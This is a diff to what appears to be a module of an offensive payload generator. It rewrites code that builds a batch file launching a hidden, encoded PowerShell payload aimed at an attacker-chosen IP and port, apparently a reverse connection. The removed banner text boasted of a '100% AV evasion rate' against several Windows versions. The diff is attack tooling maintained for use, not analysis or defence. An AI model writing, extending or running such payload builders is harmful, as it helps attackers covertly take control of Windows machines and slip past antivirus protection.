@@ -14,11 +14,8 @@ from src.core import menus
 iface = iface_ip()
 
 def moduleInfo():
-	print colours.bold + colours.green + \
+	print colours.bold + colours.cyan + \
 """ #################################################################
- # This powershell module currently has a 100% AV evasion rate.  #
- #                                                               #
- # Compatible with XP, 2k3, 7 & 2k8.                             #
  # The payload requires the target to have powershell installed. #
  #################################################################""" + colours.reset
 
@@ -106,12 +103,11 @@ while 1:
 			
 		# create payload bat file in /tmp
 		PrintInfo("Creating output/paygen-pl.bat")
-		payload2 = generate_payload(payload, ipaddr, port)
-		payloadfile = "output/paygen-pl.bat"
-		fw = open(payloadfile, "w")
-		fw.write("@echo off\n")
+		encCommand = generate_payload(payload, ipaddr, port)
+		fw = open("output/paygen-pl.bat", "w")
+		fw.write("@ECHO OFF\n")
 		fw.write("\n")
-		fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % payload2)
+		fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % encCommand)
 		fw.close()
 		time.sleep(2)
 
